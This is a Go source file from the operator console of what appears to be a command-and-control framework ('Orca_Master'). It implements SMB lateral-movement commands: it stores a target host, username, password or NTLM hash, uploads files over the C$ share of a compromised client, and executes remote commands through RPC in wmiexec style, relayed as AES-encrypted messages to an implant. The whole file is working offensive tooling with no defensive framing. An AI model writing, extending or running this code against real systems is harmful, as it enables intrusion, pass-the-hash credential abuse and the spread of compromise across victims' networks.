package controller

import (
	"Orca_Master/cli/cmdopt/fileopt"
	"Orca_Master/cli/cmdopt/smbopt"
	"Orca_Master/cli/common"
	"Orca_Master/define/colorcode"
	"Orca_Master/define/config"
	"Orca_Master/define/retcode"
	"Orca_Master/tools/crypto"
	"encoding/json"
	"fmt"
	"github.com/desertbit/grumble"
	"net"
	"path/filepath"
	"strings"
	"time"
)

var smbCmd = &grumble.Command{
	Name:  "smb",
	Help:  "lateral movement through the ipc$ pipe",
	Usage: "smb set|show|upload|exec [-h | --help]",
}

var smbSetCmd = &grumble.Command{
	Name:  "set",
	Help:  "set options for smb",
	Usage: "smb set [-h | --help] [-H | --host host] [-u | --user username] [-p | --pass password] [--hash hash]",
	Flags: func(f *grumble.Flags) {
		f.String("H", "host", "", "smb host")
		f.String("u", "user", "", "smb username")
		f.String("p", "pass", "", "smb password")
		f.String("D", "domain", "", "smb domain")
		f.StringL("hash", "", "smb hash")
	},
	Run: func(c *grumble.Context) error {
		host := c.Flags.String("host")
		user := c.Flags.String("user")
		pass := c.Flags.String("pass")
		hash := c.Flags.String("hash")
		domain := c.Flags.String("domain")
		if host == "" {
			host = smbopt.MySmb.Host
		}
		if user == "" {
			user = smbopt.MySmb.User
		}
		if pass == "" {
			pass = smbopt.MySmb.Pwd
		}
		if hash == "" {
			hash = smbopt.MySmb.Hash
		}
		if domain == "" {
			domain = smbopt.MySmb.Domain
		}
		_, err := net.ResolveTCPAddr("tcp4", host)
		if err != nil {
			_, err := net.ResolveIPAddr("ip4", host)
			if err != nil {
				message := fmt.Sprintf("Invalid host address [%s]", err)
				colorcode.PrintMessage(colorcode.SIGN_ERROR, message)
				return nil
			}
			host = fmt.Sprintf("%s:%d", host, 445)
		}
		smbopt.SmbSet(host, user, pass, hash, domain)
		colorcode.PrintMessage(colorcode.SIGN_SUCCESS, "options set successfully")
		return nil
	},
}

var smbShowCmd = &grumble.Command{
	Name:  "show",
	Help:  "show smb options",
	Usage: "smb show [-h | --help]",
	Run: func(c *grumble.Context) error {
		fmt.Println("Target_Host:", smbopt.MySmb.Host)
		fmt.Println("Username:", smbopt.MySmb.User)
		fmt.Println("Password:", smbopt.MySmb.Pwd)
		fmt.Println("Hash:", smbopt.MySmb.Hash)
		fmt.Println("Domain:", smbopt.MySmb.Domain)
		return nil
	},
}

var smbUploadCmd = &grumble.Command{
	Name:  "upload",
	Help:  "upload files using smb pipeline",
	Usage: "smb upload [-h | --help] <filename>",
	Args: func(a *grumble.Args) {
		a.String("filename", "filename uploaded via C$ pipe")
	},
	Run: func(c *grumble.Context) error {
		if SelectId == -1 {
			colorcode.PrintMessage(colorcode.SIGN_ERROR, "please select the id first")
			return nil
		}
		if smbopt.MySmb.User == "" || smbopt.MySmb.Host == "" {
			colorcode.PrintMessage(colorcode.SIGN_ERROR, "please set the smb option first")
			return nil
		}
		localFile := c.Args.String("filename")
		if !fileopt.IsLocalFileLegal(localFile) {
			return nil
		}
		_, fileName := filepath.Split(localFile)
		remoteFile := fileName
		// 发送文件元信息
		data := smbopt.GetFileMetaInfo(localFile, remoteFile)
		retData := fileopt.SendFileMetaMsg(SelectClientId, data, "smbUpload")
		if retData.Code != retcode.SUCCESS {
			colorcode.PrintMessage(colorcode.SIGN_FAIL, "file upload failed")
			return nil
		}
		// 分片发送文件
		fileopt.SendFileData(SelectClientId, localFile)
		// 接收消息，显示是否发送成功
		select {
		case msg := <-common.DefaultMsgChan:
			_, _, retData := common.SettleRetDataEx(msg)
			_, _, decData := common.SettleRetData(msg)
			fmt.Println(decData)
			if retData.Code == retcode.SUCCESS {
				message := fmt.Sprintf("%s --> %s", localFile, "C:\\"+fileName)
				colorcode.PrintMessage(colorcode.SIGN_SUCCESS, message)
			}
		case <-time.After(20 * time.Second):
			colorcode.PrintMessage(colorcode.SIGN_FAIL, "request timed out")
			return nil
		}
		time.Sleep(100 * time.Millisecond)
		return nil
	},
}

var smbExecCmd = &grumble.Command{
	Name:  "exec",
	Help:  "execute remote command through rpc service, but no echo (similar to wimexec)",
	Usage: "smb exec [-h | --help] <filename>",
	Args: func(a *grumble.Args) {
		a.StringList("command", "command sent to remote host")
	},
	Run: func(c *grumble.Context) error {
		if SelectId == -1 {
			colorcode.PrintMessage(colorcode.SIGN_ERROR, "please select the id first")
			return nil
		}
		if smbopt.MySmb.User == "" || smbopt.MySmb.Host == "" {
			colorcode.PrintMessage(colorcode.SIGN_ERROR, "please set the smb option first")
			return nil
		}
		command := c.Args.StringList("command")
		cmdStr := strings.Join(command, " ")
		smbcmd := smbopt.SmbExecStruct{
			SmbStruct: smbopt.MySmb,
			Command:   cmdStr,
		}
		mysmb, _ := json.Marshal(smbcmd)
		data, _ := crypto.Encrypt(mysmb, []byte(config.AesKey))
		retData := common.SendSuccessMsg(SelectClientId, common.ClientId, "smbExec", data)
		if retData.Code != retcode.SUCCESS {
			colorcode.PrintMessage(colorcode.SIGN_FAIL, "request failed")
			return nil
		}
		select {
		case msg := <-common.DefaultMsgChan:
			_, _, decData := common.SettleRetData(msg)
			fmt.Println(decData)
		case <-time.After(10 * time.Second):
			colorcode.PrintMessage(colorcode.SIGN_FAIL, "request timed out")
			return nil
		}
		time.Sleep(1 * time.Second)
		return nil
	},
}
